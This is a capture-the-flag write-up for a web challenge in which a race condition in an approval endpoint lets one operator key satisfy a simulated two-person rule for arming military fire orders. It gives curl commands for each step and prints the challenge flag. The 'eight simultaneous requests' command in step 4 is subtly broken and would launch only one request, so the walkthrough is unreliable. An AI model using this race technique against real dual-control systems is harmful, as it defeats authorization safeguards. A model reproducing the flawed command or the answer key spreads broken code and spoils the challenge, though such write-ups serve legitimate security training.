# Two-Key Turn

**Category:** Web · **Points:** 123 · **Flag:** `CSCTF{RNfBjX87eqG48i6pNhrHfPI4}`

## What the handout gives you

The challenge provides a live web service simulating Kessara's coastal fire-authorization console and a single operator key:

- `README.md` — briefing detailing the two-person rule, the operator key `opk_vega7_2f4b9c17e0a3` assigned to officer `VEGA-7`, instructions to authenticate requests via `Authorization: Bearer <key>`, and the self-describing API route at `/schema`.
- Live web service — an HTTP REST API enforcing dual control on military fire orders. No offline code archive or local container bundle is provided.

## Walkthrough

1. **Query the API schema.**
   Send a GET request to `/schema` with the provided bearer token:

   ```bash
   curl -s -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3" http://<instance>/schema
   ```

   The schema defines three endpoints: `GET /orders` to list all orders, `GET /orders/<id>` to view order details, and `POST /orders/<id>/approve` to submit an authorization approval. It specifies that orders require approvals from two distinct officers before changing state from `PENDING` to `ARMED`.

2. **Locate the pending fire order.**
   Query the order listing endpoint to find active targets:

   ```bash
   curl -s -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3" http://<instance>/orders
   ```

   The returned JSON array lists several closed orders and one open order: identifier `AO-7D31C9`. Its status is `PENDING`, and its `approvals` list contains zero entries.

3. **Inspect order details and idempotence handling.**
   Query the specific order record:

   ```bash
   curl -s -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3" http://<instance>/orders/AO-7D31C9
   ```

   Testing a standard approval with a single POST request records officer `VEGA-7` in the order's approval array. A second sequential approval request using the same bearer token returns an error stating that officer `VEGA-7` has already signed order `AO-7D31C9`. The application validates that the calling officer does not already exist in the `approvals` list, but it does so without row-level locking or atomic transaction isolation.

4. **Exploit the approval race condition.**
   The backend performs a non-atomic read-check-write cycle. If multiple approval requests arrive at the exact same moment, each request checks the list before the other has appended its entry. Send eight simultaneous POST approval requests across separate TCP connections:

   ```bash
   echo http://<instance>/orders/AO-7D31C9/approve | xargs -n 1 -P 8 curl -s -X POST -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3"
   ```

   Two concurrent requests clear the duplicate check before either writes its record. Both write operations succeed, registering two approvals for officer `VEGA-7`.

5. **Fetch the armed authorization code.**
   Request the updated order detail:

   ```bash
   curl -s -H "Authorization: Bearer opk_vega7_2f4b9c17e0a3" http://<instance>/orders/AO-7D31C9
   ```

   The order's `approvals` array now holds `["VEGA-7", "VEGA-7"]`. Having reached the two-approval threshold, the order state switches to `ARMED`, and the JSON response exposes the `arming_authorization` property containing the flag.

## Answer

The server returns the armed order record with the flag in the `arming_authorization` field:

```
CSCTF{RNfBjX87eqG48i6pNhrHfPI4}
```

## Notes

The backend tracks approvals in an array and checks membership before appending. Because the check and the append operations are not wrapped in an atomic database lock or transaction, sending requests in parallel creates a time-of-check to time-of-use race condition. This bypasses the single-officer limit and satisfies the two-person rule using only one credential.
